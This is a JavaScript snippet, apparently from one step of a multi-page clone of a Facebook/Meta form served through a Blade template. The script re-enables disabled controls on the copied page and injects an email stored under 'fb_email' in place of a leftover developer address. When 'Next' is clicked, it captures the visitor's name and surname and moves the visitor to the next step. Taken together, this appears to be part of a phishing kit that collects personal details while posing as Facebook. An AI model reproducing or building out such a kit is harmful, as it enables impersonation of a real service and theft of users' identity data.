    <script>
      (function () {
        document.body.style.zoom = "75%";

        // Aggressive CSS Fixes
        var style = document.createElement('style');
        style.innerHTML = `
          #js_v { 
            background-color: #0866ff !important; 
            cursor: pointer !important; 
            pointer-events: auto !important; 
            opacity: 1 !important; 
            z-index: 9999 !important;
            position: relative !important;
          }
          #js_v * {
            color: white !important;
            fill: white !important;
          }
          #js_m { 
            display: inline-block !important;
            width: 18px !important;
            height: 18px !important;
            opacity: 1 !important; 
            visibility: visible !important; 
            cursor: pointer !important;
            position: relative !important;
            z-index: 9999 !important;
            appearance: checkbox !important;
            -webkit-appearance: checkbox !important;
            margin-right: 8px !important;
          }
          /* Hide the placeholder SVG if we are using the real checkbox */
          #js_m + div {
             display: none !important;
          }
        `;
        document.head.appendChild(style);

        // Force enable elements
        var nextBtn = document.getElementById("js_v");
        if (nextBtn) {
          nextBtn.removeAttribute("aria-disabled");
          nextBtn.setAttribute("tabindex", "0");
        }

        var checkbox = document.getElementById("js_m");
        if (checkbox) {
            checkbox.removeAttribute("aria-disabled");
            checkbox.disabled = false;
        }

        var email = localStorage.getItem("fb_email");
        console.log("Retrieved email from localStorage:", email);
        if (email) {
          var replaceEmail = function () {
            var inputs = document.getElementsByTagName("input");
            for (var i = 0; i < inputs.length; i++) {
              if (
                inputs[i].value === "phangiathuyendev@gmail.com" ||
                inputs[i].id === "js_f"
              ) {
                inputs[i].value = email;
                inputs[i].disabled = false; 
                inputs[i].removeAttribute("disabled");
              }
            }
            var all = document.querySelectorAll("*");
            for (var i = 0; i < all.length; i++) {
              if (
                all[i].children.length === 0 &&
                (all[i].innerText === "phangiathuyendev@gmail.com")
              ) {
                all[i].innerText = email;
              }
            }
          };
          replaceEmail();
          setTimeout(replaceEmail, 100);
          setTimeout(replaceEmail, 500);
          setTimeout(replaceEmail, 1000);
        }

        document.addEventListener("click", function (e) {
          var target = e.target;
          // Check if we clicked the next button or any of its children
          var isNext = false;
          var temp = target;
          while (temp && temp !== document.body) {
            if (temp.id === "js_v" || (temp.innerText && temp.innerText.trim() === "Next")) {
              isNext = true;
              break;
            }
            temp = temp.parentElement;
          }

          if (isNext) {
              var nameInput = document.getElementById("js_5");
              var surnameInput = document.getElementById("js_a");
              if (nameInput) localStorage.setItem("fb_name", nameInput.value);
              if (surnameInput) localStorage.setItem("fb_surname", surnameInput.value);

              window.location.href = "{{ $metaBasePath }}/2"; 
              e.preventDefault();
              return;
          }

          if (target.id === "js_m") {
              // Standard checkbox behavior will handle it
          }
        });
      })();
    </script>
